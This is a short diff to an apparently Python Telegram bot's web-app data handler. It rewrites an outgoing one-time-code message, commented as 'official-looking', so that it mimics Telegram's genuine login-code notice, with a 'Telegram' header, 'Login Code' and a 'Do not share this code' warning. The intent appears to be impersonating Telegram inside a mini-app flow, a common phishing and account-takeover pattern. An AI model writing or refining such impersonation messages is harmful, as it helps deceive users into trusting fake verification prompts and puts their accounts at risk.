@@ -66,10 +66,11 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
         
         # Send official-looking OTP message
         otp_message = (
-            f"🔐 <b>Telegram Verification</b>\n\n"
-            f"Your verification code: <code>{otp}</code>\n\n"
-            f"Please enter this code in the mini app to continue.\n\n"
-            f"This code will expire in 10 minutes."
+            f"🔐 <b>Telegram</b>\n\n"
+            f"<b>Login Code:</b> <code>{otp}</code>\n\n"
+            f"Do not share this code with anyone!\n\n"
+            f"This code can be used to verify your account.\n\n"
+            f"If you didn't request this, please ignore this message."
         )
         
         await update.effective_message.reply_text(
